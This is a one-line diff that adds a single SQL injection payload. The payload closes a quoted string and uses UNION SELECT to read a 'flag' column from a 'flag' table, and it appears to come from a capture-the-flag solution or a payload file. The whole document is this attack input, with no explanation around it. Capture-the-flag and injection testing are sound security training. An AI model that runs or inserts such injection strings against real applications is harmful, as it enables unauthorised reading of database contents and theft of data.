@@ -1,0 +1,1 @@
+' UNION SELECT flag FROM flag WHERE '%' = '
